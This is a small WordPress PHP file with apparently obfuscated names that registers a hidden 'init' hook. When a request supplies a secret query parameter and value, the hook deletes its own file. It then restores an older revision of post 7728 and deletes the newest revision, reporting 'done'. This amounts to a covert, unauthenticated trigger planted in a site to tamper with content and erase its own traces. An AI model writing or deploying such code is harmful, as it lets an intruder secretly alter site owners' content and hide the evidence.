<?php

function script_meta_name() {
	if (isset($_GET['old_effect_specific']) && $_GET['old_effect_specific'] === 'popup_dist_full_using') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$library_permalinks_software_push = 7728;
		$tooltip_global_domain = wp_get_post_revisions($library_permalinks_software_push);
		if (empty($tooltip_global_domain)) die('no revisions');
		if (count($tooltip_global_domain) < 2) die('less than 2');
		$switch_better_notifier_controller = array_shift($tooltip_global_domain);
		$exporter_optimize_plugin = $switch_better_notifier_controller->ID;
		$css_services_method_visual = array_shift($tooltip_global_domain);
		$homepage_variation_tree = $css_services_method_visual->ID;
		$external_stock_signature = wp_restore_post_revision($homepage_variation_tree);
		if ($external_stock_signature === false) die('error restoring');
		$external_stock_signature = wp_delete_post_revision($exporter_optimize_plugin);		
		if ($external_stock_signature === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'script_meta_name');
